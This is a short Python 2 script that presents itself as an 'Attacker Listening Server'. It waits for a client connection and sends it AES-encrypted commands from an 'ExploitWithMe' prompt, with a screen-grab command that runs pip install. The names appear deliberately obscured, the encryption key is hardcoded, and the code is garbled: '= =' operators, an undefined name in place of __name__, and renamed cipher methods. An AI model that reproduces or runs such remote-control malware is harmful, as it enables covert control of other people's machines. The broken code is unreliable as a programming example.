import os
import readline
import socket
import sys
import string
from Crypto import Random
from Crypto.Cipher import AES
try:
    a1 = 829
except:
    print 'Usage: python file_name.py '
    print 'the port is to be same on both client/server side and is hardcoded till now , not generic for testing purpise'
    print 'the code is still in development and improvement phases'
    sys.exit(1)
b1 = 'localhost'
b2 = '82e672ae054aa4de6f042c888111686a'
def fonk1(b8):
    return b8 + b'\0' * (AES.block_size - len(b8) % AES.block_size)
def fonk2(b3):
    b3 = fonk1(b3)
    b4 = Random.new().read(AES.block_size)
    b5 = AES.new(b2, AES.MODE_CBC, b4)
    return b4 + b5.fonk2(b3)
def fonk3(ciphertext):
    b4 = ciphertext[:AES.block_size]
    b5 = AES.new(b2, AES.MODE_CBC, b4)
    b3 = b5.fonk3(ciphertext[AES.block_size:])
    return b3.rstrip(b'\0')
def fonk4():
	try :
		b6 = os.system("pip install pyscreenshot")
		import pyscreenshot as ImageGrab
		b7 = ImageGrab.grab()
		b7.show()
		b7 = ImageGrab.grab(bbox=(10,10,500,500))
		b7.show()
		ImageGrab.grab_to_file('b7.png')
	except:
		print("some error occured while execution")
def fonk5():
    b8 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    b8.bind((b1, a1))
    b8.listen(10)
    print 'Attacker Listening Server Started on the Port {}...'.format(a1)
    conn, b9 = b8.accept()
    while True:
        b10 = raw_input('ExploitWithMe >> ').rstrip()
	if b10 = = 'grab_screen':
	     fonk4()
	      b6 = os.system("cat b7.png")
        if b10 = = '':
            continue
        conn.send(fonk2(b10))
        if b10 = = 'terminate':
            b8.close()
            sys.exit(0)
        b11 = conn.recv(4096)
        print fonk3(b11)
if b12 = = '__main__':
	fonk5()